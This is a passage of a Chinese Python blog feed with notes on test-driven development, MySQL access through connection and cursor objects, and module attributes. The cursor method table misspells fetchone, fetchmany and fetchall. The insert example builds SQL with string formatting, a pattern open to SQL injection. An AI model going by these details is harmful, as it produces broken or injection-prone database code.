        <id>https://self-ferry.github.io/2021/02/07/%E5%88%9D%E8%AF%86python%E6%B5%8B%E8%AF%95%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/</id>
        <title>初识python测试驱动开发</title>
        <link rel="alternate" href="https://self-ferry.github.io/2021/02/07/%E5%88%9D%E8%AF%86python%E6%B5%8B%E8%AF%95%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/"/>
        <content type="html">&lt;p&gt;&lt;span class=&#34;label success&#34;&gt;✔️Music！&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;media-container&#34;&gt;&lt;div class=&#34;player&#34; data-type=&#34;audio&#34; data-src=&#39;[{&#34;title&#34;:&#34;列表 1&#34;,&#34;list&#34;:[&#34;https://music.163.com/#/song?id=1384407086&#34;]}]&#39;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h1 id=&#34;导读&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#导读&#34;&gt;#&lt;/a&gt; 导读&lt;/h1&gt;
&lt;p&gt;本章主要介绍敏捷开发模式。敏捷开发是 20 世纪 90 年代兴起的一种新型软件开发方法，能快速应对需求的变化。他需要分析人员与程序开发人员紧密协作，采用面对面的有效沟通方式频繁交付新的软件版本。测试驱动是敏捷开发的重要组成部分，python 是敏捷开发项目常采用的一种语言。本章重点介绍测试驱动开发的特点、步骤和环境建立，以及 Python 单元测试，doctest 和 Epydoc 的使用。&lt;/p&gt;
&lt;h1 id=&#34;正文&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#正文&#34;&gt;#&lt;/a&gt; 正文&lt;/h1&gt;
&lt;h2 id=&#34;测试驱动开发&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#测试驱动开发&#34;&gt;#&lt;/a&gt; 测试驱动开发&lt;/h2&gt;
&lt;p&gt;测试驱动开发 (Test-Driven-Development)，简称 TDD，是一种有别于传统开发的新型开发方法。它要求在编写某个功能的代码之前先编写测试代码，让后编写是测试通过的代码，通过测试来推动整个开发的进行。这有助于编写简洁可用和高质量的代码，以便加速开发进程。&lt;/p&gt;
&lt;h3 id=&#34;测试驱动开发模式tdd&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#测试驱动开发模式tdd&#34;&gt;#&lt;/a&gt; 测试驱动开发模式 (TDD)&lt;/h3&gt;
&lt;p&gt;当下科技高速发展，软件规模越来越大，软件开发人员也越来越多，因此软件开发过程必须要有知道开发的软件模式。一些小项目也许可以采用边做边改的开发模式，项目一旦做大，这样的开发模式就不能满足需求了。&lt;/p&gt;
&lt;p&gt;瀑布模型作为传统的开发模式，曾一度受到追捧，它将软件生命周期划外为制定计划，需求分析、软件设计、程序开发、软件测试和运行维护六个阶段，这六个阶段的各项活动严格按照线性方式进行，每一个阶段的工作成果都需要进行验证，验证通过才能进入下一阶段，否则返回修改。&lt;/p&gt;
&lt;p&gt;传统的开发模型除了瀑布模型外，还有造代模型、快速原型模型、增量模型、螺旋模型，但这些模型都有自身的缺点，如何适应瞬息万变的需求变化，如何高效地实施软件开发，是每个软件行业人员必须思考的问题。&lt;/p&gt;
&lt;p&gt;敏捷开发在这样的环境下应运而生，它是一种以人为核心、迭代、循序渐进的开发方法，开发过程中，软件项目的构建被切分成多个子项目，各个子项目既相对独立又相互联系，可以分别完成，开发过程中软件一直处于可使用状态。&lt;/p&gt;
&lt;p&gt;测试驱动开发模式 TDD 是敏捷开发的重要组成部分，也是一种设计方法论，其基本思想就是在开发某个功能代码前，先编写测试代码，然后编写功能代码并用测试代码进行验证，如此循环直到完成全部功能的开发。&lt;/p&gt;
&lt;p&gt;测试模型中的 V 模型和 X 模型都是 TDD 的最好体现方式，V 模型如图所示：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image001.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;V 模型在开发的各个阶段，包括需求分析、概要设计、详细设计、编码过程中都考虑相对应的测试工作，完成相关的测试用例设计和测试脚本编写。&lt;/p&gt;
&lt;p&gt;X 模型是对详细阶段和编码阶段进行建模，针对某个功能进行对应的测试驱动开发。X 模型的左侧描述的是针对单独程序片段所进行的相互分离的编码和测试，此后进行频繁的集成，通过集成最终成为可执行的程序，然后再对这些可执行程序进行测试. X 模型还定位了探索性测试，这是不进行事先计划的特殊类型的测试，这一方式往往能帮助有经验的测试人员在测试计划之外发现更多的软件错误。&lt;/p&gt;
&lt;p&gt;X 模型如图所示&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image002.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;TDD 的优点：节省了调试程序及挑错的时间，在任意一个开发节点都可以拿出一个可以使用含少量 bug 并具有一定功能和能够发布的产品。&lt;br /&gt;
TDD 的缺点：增加代码量，测试代码是系统代码的两倍或更多倍。&lt;/p&gt;
&lt;h3 id=&#34;tdd使用步骤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tdd使用步骤&#34;&gt;#&lt;/a&gt; TDD 使用步骤&lt;/h3&gt;
&lt;p&gt;TDD 在满足软件开发目标的同时，也要实现代码的简单整洁。&lt;br /&gt;
在明确软件需求后，对一个新功能的开发过程包括以下步骤，如图 4-3 所示。&lt;br /&gt;
步骤 01: 明确当前代码要完成的功能。可以记录成一个列表，必要时需写相关接口。&lt;br /&gt;
步骤 02: 快速新增对要完成功能的测试。&lt;br /&gt;
步骤 03 : 运行测试，判断测试代码是否通过，通过则执行步骤 06, 不通过则执行步骤 04。&lt;br /&gt;
步骤 04: 编写对应的功能代码。&lt;br /&gt;
步骤 05 : 重新运行测试，保证全部通过。&lt;br /&gt;
步骤 06: 对代码进行重构，优化代码结构。&lt;br /&gt;
步骤 07: 循环完成所有功能的开发。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image003.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;tips&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tips&#34;&gt;#&lt;/a&gt; Tips&lt;/h3&gt;
&lt;p&gt;要完成一个系统，代码的功能点可能很多，需求也可能随时变化，任何阶段想添加功能，都应吧相关的功能点加到测试列表中，避免疏漏。&lt;/p&gt;
&lt;h2 id=&#34;unittest测试框架&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#unittest测试框架&#34;&gt;#&lt;/a&gt; unittest 测试框架&lt;/h2&gt;
&lt;h1 id=&#34;reference&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#reference&#34;&gt;#&lt;/a&gt; Reference&lt;/h1&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veW91bGl4aXNoaS9hcnRpY2xlcy8zNTUxOTkyLmh0bWw=&#34;&gt;https://www.cnblogs.com/youlixishi/articles/3551992.html&lt;/span&gt;&lt;br /&gt;
《python 网络编程从入门到精通》&lt;/p&gt;
</content>
        <updated>2021-02-07T12:20:18.000Z</updated>
    </entry>
    <entry>
        <id>https://self-ferry.github.io/2021/02/07/python%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BC%96%E7%A8%8B/</id>
        <title>python数据库编程</title>
        <link rel="alternate" href="https://self-ferry.github.io/2021/02/07/python%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BC%96%E7%A8%8B/"/>
        <content type="html">&lt;p&gt;&lt;span class=&#34;label success&#34;&gt;✔️来首音乐吧&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;media-container&#34;&gt;&lt;div class=&#34;player&#34; data-type=&#34;audio&#34; data-src=&#39;[{&#34;title&#34;:&#34;列表 1&#34;,&#34;list&#34;:[&#34;https://music.163.com/#/song?id=464863017&#34;]}]&#39;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h1 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h1&gt;
&lt;p&gt;在看《python 网络编程从入门到精通》，顺便做个笔记。&lt;/p&gt;
&lt;h1 id=&#34;正文&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#正文&#34;&gt;#&lt;/a&gt; 正文&lt;/h1&gt;
&lt;p&gt;&lt;ins&gt;本章以 MySQL 为例说明&lt;/ins&gt;&lt;/p&gt;
&lt;p&gt;python 操作数据库主要涉及 connection 和 cursor 两个对象，操作流程图如下：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image001.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;connection对象&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#connection对象&#34;&gt;#&lt;/a&gt; connection 对象&lt;/h2&gt;
&lt;p&gt;connection 对象，与数据源唯一的会话，可以使用 connection 对象的集合、方法、属性实现与数据的连接。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label&#34;&gt;connection 参数列表&lt;/span&gt;&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;参数名&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;类型&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;说明&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;host&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;字符串&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;连接数据库服务器主机名，默认为本地主机 (localhost)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;port&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;数字&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;MySQL 服务器端口号，默认是 3306&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;user&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;字符串&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;连接数据库的用户名&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;password&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;字符串&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;连接数据库的密码&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;db&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;字符串&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;数据库名称&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;charset&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;字符串&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;连接编码&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;span class=&#34;label&#34;&gt;connection 方法列表&lt;/span&gt;&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;方法名&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;说明&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;cursor()&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;使用该连接创建并返回游标&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;commit()&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;提交当前事务&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;rollback()&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;回滚当前事务&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;close()&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;关闭连接&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;cursor对象&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cursor对象&#34;&gt;#&lt;/a&gt; cursor 对象&lt;/h2&gt;
&lt;p&gt;cursor 对象是游标对象，用户可以用它查询和获取结果。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label&#34;&gt;cursor 对象方法列表&lt;/span&gt;&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;方法名&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;说明&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;execute&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;执行一个数据库命令&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;fecthone&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;取结果集下一行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;fechmany(size)&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;取结果集下几行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;fechall()&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;取结果集中剩余的所有行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;rowcount&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;最近一次 execute 返回数据的行数或影响行数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;close()&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;关闭游标对象&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;一个例子&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一个例子&#34;&gt;#&lt;/a&gt; 一个例子&lt;/h2&gt;
&lt;p&gt;搬一个菜鸟教程里&lt;ins&gt;插入操作&lt;/ins&gt;的例子。&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#!/usr/bin/python&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# -*- coding: UTF-8 -*-&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; MySQLdb&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 打开数据库连接&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;db &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; MySQLdb&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;connect&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;localhost&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;testuser&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;test123&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;TESTDB&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; charset&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;utf8&#39;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 使用 cursor () 方法获取操作游标 &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;cursor &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; db&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;cursor&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# SQL 插入语句&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sql &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &#34;INSERT INTO EMPLOYEE&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;FIRST_NAME&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; \&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;       LAST_NAME&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; AGE&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; SEX&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; INCOME&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; \&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;       VALUES &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;s &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&#34; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; \&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;       &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Mac&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Mohan&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;M&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token comment&#34;&gt;# 执行 sql 语句&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   cursor&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;execute&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sql&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token comment&#34;&gt;# 提交到数据库执行&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   db&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;commit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token comment&#34;&gt;# 发生错误时回滚&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   db&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;rollback&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 关闭数据库连接&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;db&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
        <category term="python" scheme="https://self-ferry.github.io/categories/python/" />
        <category term="数据库编程" scheme="https://self-ferry.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BC%96%E7%A8%8B/" />
        <updated>2021-02-07T08:36:30.000Z</updated>
    </entry>
    <entry>
        <id>https://self-ferry.github.io/2021/02/05/python%E6%A8%A1%E5%9D%97%E7%9A%84%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7/</id>
        <title>python模块的内置属性</title>
        <link rel="alternate" href="https://self-ferry.github.io/2021/02/05/python%E6%A8%A1%E5%9D%97%E7%9A%84%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7/"/>
        <content type="html">&lt;p&gt;&lt;span class=&#34;label success&#34;&gt;✔️嘘，请安静&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;media-container&#34;&gt;&lt;div class=&#34;player&#34; data-type=&#34;audio&#34; data-src=&#39;[{&#34;title&#34;:&#34;列表 1&#34;,&#34;list&#34;:[&#34;https://music.163.com/#/song?id=532950140&#34;]}]&#39;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h1 id=&#34;模块的内置属性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#模块的内置属性&#34;&gt;#&lt;/a&gt; 模块的内置属性&lt;/h1&gt;
&lt;p&gt;对于任何一个 python 文件来说，当 python 解释器运行一个 py 文件，会自动将一些内容加载到内置的属性中；一个模块我们可以看做是一个比类更大的对象。&lt;/p&gt;
&lt;h2 id=&#34;查看内置属性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看内置属性&#34;&gt;#&lt;/a&gt; 查看内置属性&lt;/h2&gt;
&lt;p&gt;我们可以通过 dir () 方法获取该模块所有的显式或隐式属性。&lt;br /&gt;
附上 dir () 的介绍：&lt;br /&gt;
&lt;img data-src=&#34;image001.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# -*- coding:utf-8 -*-&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;doc......&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#39;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; os&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;var &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;None&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Test&lt;/span&gt;&lt;span class=&#34;token 